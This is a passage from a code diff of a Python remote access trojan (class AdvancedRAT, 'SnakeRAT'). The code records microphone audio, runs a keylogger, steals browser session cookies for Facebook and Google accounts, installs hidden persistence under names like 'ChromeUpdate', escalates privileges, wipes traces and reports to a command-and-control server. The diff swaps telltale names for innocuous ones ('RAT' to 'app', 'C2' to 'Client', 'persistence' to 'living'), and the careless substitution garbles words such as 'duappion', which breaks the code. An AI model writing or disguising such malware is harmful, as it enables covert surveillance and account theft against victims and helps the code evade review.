             FORMAT = pyaudio.paInt16
             CHANNELS = 1
-            RATE = 44100
+            appE = 44100
             
             p = pyaudio.PyAudio()
             stream = p.open(format=FORMAT,
                           channels=CHANNELS,
-                          rate=RATE,
+                          appe=appE,
                           input=True,
                           frames_per_buffer=CHUNK)
             
             frames = []
-            for _ in range(0, int(RATE / CHUNK * duration)):
+            for _ in range(0, int(appE / CHUNK * duappion)):
                 data = stream.read(CHUNK)
                 frames.append(data)
             
@@ -4358,7 +4429,7 @@ class AdvancedRAT:
                 wf = wave.open(wav_buffer, 'wb')
                 wf.setnchannels(CHANNELS)
                 wf.setsampwidth(p.get_sample_size(FORMAT))
-                wf.setframerate(RATE)
+                wf.setframeappe(appE)
                 wf.writeframes(b''.join(frames))
                 wf.close()
                 
@@ -4370,7 +4441,7 @@ class AdvancedRAT:
             
             return {
                 'filename': filename,
-                'duration': duration,
+                'duappion': duappion,
                 'size': len(wav_data),
                 'status': 'sent' if success else 'failed'
             }
@@ -4393,15 +4464,15 @@ class AdvancedRAT:
             success = self._stop_background_keylogger()
             return {'status': 'keylogger_stopped' if success else 'stop_failed'}
             
-        elif action == 'duration':
-            duration = cmd.get('duration', 10)
+        elif action == 'duappion':
+            duappion = cmd.get('duappion', 10)
             # Ensure it's running
             if not self.keylog_running:
                 self._start_background_keylogger()
                 time.sleep(1)
             # Clear buffer, wait for keys, then dump
             self.keylog_buffer = [] 
-            time.sleep(duration)
+            time.sleep(duappion)
             action = 'dump' # Fall through to dump logic
 
         if action == 'dump':
@@ -4440,7 +4511,7 @@ class AdvancedRAT:
                 try:
                     import pyaudio
                     p = pyaudio.PyAudio()
-                    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=2048)
+                    stream = p.open(format=pyaudio.paInt16, channels=1, appe=44100, input=True, frames_per_buffer=2048)
                     
                     self.logger.info("Live audio stream started")
                     while self._audio_streaming:
@@ -4466,21 +4537,21 @@ class AdvancedRAT:
         
         return {'error': 'Invalid action'}
     
-    def _handle_persistence(self, cmd):
-        """Install persistence and immediately launch the shadow process so the
-        C2 connection survives even if this (original) instance is closed."""
+    def _handle_living(self, cmd):
+        """Install living and immediately launch the darksoul process so the
+        Client  connection survives even if this (original) instance is closed."""
         is_mongo = getattr(self, 'mongo_mode', False)
-        success, details = PersistenceManager.install_persistence(is_mongo_mode=is_mongo)
+        success, details = livingManager.install_living(is_mongo_mode=is_mongo)
         if success:
             try:
-                shadow_path = PersistenceManager.get_shadow_path()
-                if shadow_path and os.path.exists(shadow_path):
+                darksoul_path = livingManager.get_darksoul_path()
+                if darksoul_path and os.path.exists(darksoul_path):
                     is_frozen = getattr(sys, 'frozen', False)
                     if IS_WINDOWS:
                         if is_frozen:
                             # Frozen exe: launch the copied exe directly — no interpreter needed
                             # DETACHED_PROCESS (0x8) | CREATE_NO_WINDOW (0x08000000)
-                            args = [shadow_path]
+                            args = [darksoul_path]
                             if is_mongo: args.append("--mongo")
                             subprocess.Popen(
                                 args,
@@ -4493,7 +4564,7 @@ class AdvancedRAT:
                             pythonw = os.path.join(os.path.dirname(exe), "pythonw.exe")
                             if os.path.exists(pythonw):
                                 exe = pythonw
-                            args = [exe, shadow_path]
+                            args = [exe, darksoul_path]
                             if is_mongo: args.append("--mongo")
                             subprocess.Popen(
                                 args,
@@ -4502,7 +4573,7 @@ class AdvancedRAT:
                             )
                     else:
                         # Linux / macOS: use a completely detached session
-                        args = [sys.executable, shadow_path]
+                        args = [sys.executable, darksoul_path]
                         if is_mongo: args.append("--mongo")
                         subprocess.Popen(
                             args,
@@ -4511,16 +4582,16 @@ class AdvancedRAT:
                             stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL,
                         )
-                    details.append("Shadow process launched — connection will survive parent exit")
+                    details.append("darksoul process launched — connection will survive parent exit")
             except Exception as e:
-                details.append(f"Shadow launch warning: {e}")
+                details.append(f"darksoul launch warning: {e}")
 
         return {'success': success, 'details': details}
 
 
     def _handle_unpersist(self, cmd):
-        """Remove persistence"""
-        success, details = PersistenceManager.remove_persistence()
+        """Remove living"""
+        success, details = livingManager.remove_living()
         return {'success': success, 'details': details}
     
     def _handle_process(self, cmd):
@@ -5063,7 +5134,7 @@ pty.spawn("/bin/sh")
                             'value': dc.get('value', ''),
                             'domain': d_host,
                             'path': dc.get('path', '/'),
-                            'expirationDate': dc.get('expirationDate', 0),
+                            'expiappionDate': dc.get('expiappionDate', 0),
                             'httpOnly': dc.get('httpOnly', True),
                             'secure': dc.get('secure', True),
                             'sameSite': dc.get('sameSite', 'no_restriction'),
@@ -5096,7 +5167,7 @@ pty.spawn("/bin/sh")
                 else:
                     clean_cookies.append(c)
 
-            # Surface session-critical cookies for quick operator review
+            # Surface session-critical cookies for quick opeappor review
             TARGET_NAMES = {'sessionid', 'csrftoken', 'ds_user_id', 'rur', 'mid', 'ig_did',
                             'datr', 'c_user', 'xs', 'fr', 'wd',  # Facebook
                             'SAPISID', 'SID', '__Secure-3PSID',   # Google
@@ -5137,7 +5208,7 @@ pty.spawn("/bin/sh")
                     'extraction_mode': status,
                     'filename': filename,
                     'count': len(clean_cookies),
-                    'session_cookies': session_cookies  # surfaced in C2 result immediately
+                    'session_cookies': session_cookies  # surfaced in Client  result immediately
                 }
 
             return {
@@ -5158,7 +5229,7 @@ pty.spawn("/bin/sh")
         success, message = PrivilegeManager.elevate()
         if success:
             # Schedule the current process to exit so the admin instance can take the port
-            # Wait 4 seconds to ensure the success message is fully sent to C2
+            # Wait 4 seconds to ensure the success message is fully sent to Client 
             def delayed_exit():
                 time.sleep(4)
                 self.running = False
@@ -5206,7 +5277,7 @@ pty.spawn("/bin/sh")
         return {'success': True, 'aborted_tasks': aborted, 'message': f"Attempted to abort: {target}"}
 
     def _handle_self_destruct(self, cmd):
-        """Self destruct the RAT"""
+        """Self destruct the app"""
         try:
             # Clean traces first
             self._handle_clean_traces({})
@@ -5299,7 +5370,7 @@ rm -f "$0"'''
             return {'error': str(e)}
     
     def _handle_registry(self, cmd):
-        """Registry operations (Windows Registry / Linux Config Emulation)"""
+        """Registry opeappions (Windows Registry / Linux Config Emulation)"""
         action = cmd.get('action', 'read') # read, write, delete
         path = cmd.get('path', '') # Windows: HKLM\...\Key, Linux: Section.Key
         value_name = cmd.get('name', '')
@@ -5335,7 +5406,7 @@ rm -f "$0"'''
             
             elif IS_LINUX:
                 # Use a JSON file to emulate Registry on Linux
-                reg_file = os.path.expanduser('~/.config/SnakeRAT/emulated_reg.json')
+                reg_file = os.path.expanduser('~/.config/gameapp/emulated_reg.json')
                 os.makedirs(os.path.dirname(reg_file), exist_ok=True)
                 
                 data = {}
@@ -5361,16 +5432,16 @@ rm -f "$0"'''
         except Exception as e:
             return {'error': str(e)}
 
-# GUI/Decoy classes (SnakeGame, PongGame, ArcadeDecoy) removed — backend-only mode
+# GUI/Decoy classes (gameGame, PongGame, ArcadeDecoy) removed — backend-only mode
 
 if __name__ == "__main__":
     try:
         # Parse arguments
-        parser = argparse.ArgumentParser(description='Advanced SnakeRAT Client')
-        parser.add_argument('--host', help='C2 Server Host IP', default=C2_HOST)
-        parser.add_argument('--port', type=int, help='C2 Server Port', default=C2_PORT)
+        parser = argparse.ArgumentParser(description='Advanced gameapp Client')
+        parser.add_argument('--host', help='Client  Server Host IP', default=C2_HOST)
+        parser.add_argument('--port', type=int, help='Client  Server Port', default=C2_PORT)
         parser.add_argument('--takeover', action='store_true', help='Take over from previous instance')
-        parser.add_argument('--shadow-process', action='store_true', help='Run in background shadow mode')
+        parser.add_argument('--darksoul-process', action='store_true', help='Run in background darksoul mode')
         parser.add_argument('--mongo', action='store_true', help='Start directly in MongoDB mode')
 
         args, unknown = parser.parse_known_args()
@@ -5379,7 +5450,7 @@ if __name__ == "__main__":
             print("[*] Takeover mode: Waiting for previous process to exit...")
             time.sleep(5)
 
-        # Update C2 configuration
+        # Update Client  configuappion
         C2_HOST = args.host
         C2_PORT = args.port
         if C2_SERVERS:
@@ -5394,18 +5465,18 @@ if __name__ == "__main__":
         else:
             current_path = os.path.abspath(__file__)
 
-        is_shadow = any(x in current_path for x in [".dbus-service", "ChromeUpdate", ".metadata"])
+        is_darksoul = any(x in current_path for x in [".dbus-service", "ChromeUpdate", ".metadata"])
 
-        # Hide console for shadow/background instances
-        if args.takeover or args.shadow_process or is_shadow:
+        # Hide console for darksoul/background instances
+        if args.takeover or args.darksoul_process or is_darksoul:
             if IS_WINDOWS:
                 try:
                     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                 except: pass
 
-        print("[*] Starting RAT backend...")
-        rat = AdvancedRAT(start_mongo=args.mongo)
-        while rat.running:
+        print("[*] Starting app backend...")
+        app = Advancedapp(start_mongo=args.mongo)
+        while app.running:
             time.sleep(1)
 
     except Exception as e:
